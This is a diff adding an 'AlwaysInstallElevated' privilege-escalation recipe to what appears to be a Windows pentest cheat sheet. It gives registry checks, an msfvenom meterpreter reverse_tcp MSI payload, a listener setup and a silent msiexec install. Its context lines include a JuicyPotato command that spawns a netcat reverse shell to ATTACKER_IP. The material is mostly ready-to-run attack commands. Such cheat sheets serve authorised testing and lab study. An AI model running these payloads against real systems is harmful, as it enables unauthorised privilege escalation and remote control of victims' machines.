@@ -1104,6 +1104,29 @@ psexec.py -n -k domain.local/Administrator@PC-NAME
 https://tryhackme.com/room/windowsprivescarena
 ```
 
+## Always Installed
+
+Check if the "AlwaysInstallElevated" is 1
+```
+reg query HKLM\Software\Policies\Microsoft\Windows\Installer
+```
+```
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer
+```
+
+Create a .msi payload
+```
+msfvenom -p windows/meterpreter/reverse_tcp lhost=IP -f msi -o setup.msi
+```
+Set up a listener
+```
+msfconsole; use multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost <IP>; exploit
+```
+Execute the .msi payload
+```
+msiexec /quiet /qn /i C:\Temp\setup.msi
+```
+
 ### SeImpersonatePrivilege (JuicyPotato.exe)
 ```
 .\JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -l 1337 -a "/c C:\PATH\TO\nc.exe -e C:\Windows\System32\cmd.exe ATTACKER_IP ATTACKER_PORT"
